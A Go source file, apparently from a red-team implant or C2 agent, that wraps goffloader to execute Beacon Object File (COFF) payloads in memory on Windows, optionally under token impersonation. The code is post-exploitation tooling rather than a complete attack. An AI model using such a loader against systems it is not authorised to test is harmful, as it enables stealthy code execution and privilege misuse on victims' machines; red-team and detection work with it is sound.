//go:build windows

package coffloader

import (
	"fmt"
)

// RunWindowsCOFF executes a COFF/BOF payload using goffloader on Windows.
// Export is accepted for parity, but goffloader determines the entry from the object itself.
// If token is non-zero the BOF entry point runs under impersonation via PreExecHook / PostExecHook.
func RunWindowsCOFF(payload []byte, export string, args []CoffArg, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("coff loader panic: %v", r)
			out = ""
		}
	}()

	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}

	method := export
	if method == "" {
		method = "go"
	}

	packedArgs, err := PackCoffArgs(args)
	if err != nil {
		return "", err
	}

	packed, err := LighthousePackArgs(packedArgs)
	if err != nil {
		return "", fmt.Errorf("packing BOF args: %w", err)
	}

	output, err := LoadWithToken(payload, packed, method, token)
	if err != nil {
		return output, fmt.Errorf("executing COFF module: %w", err)
	}

	return output, nil
}
